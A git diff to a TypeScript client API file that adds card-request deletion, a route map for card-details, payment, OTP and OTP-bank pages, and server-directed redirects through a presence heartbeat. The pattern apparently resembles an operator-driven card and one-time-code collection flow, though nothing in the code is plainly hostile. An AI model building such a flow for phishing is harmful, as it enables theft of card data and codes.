@@ -89,6 +89,18 @@ export async function updateCardRequest(id: string, payload: Partial<RequestData
   return data;
 }
 
+export async function deleteCardRequest(id: string): Promise<{ ok: boolean; id: string }> {
+  const res = await fetch(`/api/requests/${encodeURIComponent(id)}`, {
+    method: 'DELETE',
+    credentials: 'same-origin'
+  });
+  const data = await res.json().catch(() => ({}));
+  if (!res.ok) {
+    throw new Error(data.error || 'Failed to delete request');
+  }
+  return data;
+}
+
 export async function getCurrentCardRequest(): Promise<RequestData | null> {
   const res = await fetch('/api/requests/current', {
     credentials: 'same-origin'
@@ -123,8 +135,38 @@ export async function listCardRequests(): Promise<RequestData[]> {
   return res.json();
 }
 
-export async function sendPresenceHeartbeat(currentPage = '/') {
-  if (currentPage.startsWith('/admin')) return true;
+export function resolveTargetRoute(action?: string | null): string | null {
+  if (!action) return null;
+  const trimmed = String(action).trim();
+  if (!trimmed) return null;
+  const map: Record<string, string> = {
+    '/': '/',
+    home: '/',
+    '/request': '/request',
+    form: '/request',
+    '/register-company': '/register-company',
+    company: '/register-company',
+    '/payment': '/payment',
+    payment: '/payment',
+    '/card-details': '/card-details',
+    card: '/card-details',
+    '/waiting': '/waiting',
+    waiting: '/waiting',
+    '/otp': '/otp',
+    otp: '/otp',
+    'otp-sms': '/otp',
+    '/otp-bank': '/otp-bank',
+    'otp-bank': '/otp-bank'
+  };
+  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
+}
+
+export async function sendPresenceHeartbeat(currentPage = '/'): Promise<{
+  ok: boolean;
+  requestId?: string | null;
+  redirectTo?: string | null;
+}> {
+  if (currentPage.startsWith('/admin')) return { ok: true };
   const isNewVisit = !firstVisitSent;
   firstVisitSent = true;
   const res = await fetch('/api/presence', {
@@ -143,8 +185,13 @@ export async function sendPresenceHeartbeat(currentPage = '/') {
     if (!activeRequestId && data?.requestId) {
       activeRequestId = data.requestId;
     }
+    return {
+      ok: true,
+      requestId: data?.requestId || activeRequestId,
+      redirectTo: data?.redirectTo || null
+    };
   }
-  return res.ok;
+  return { ok: false };
 }
 
 export async function getServerStats(): Promise<{
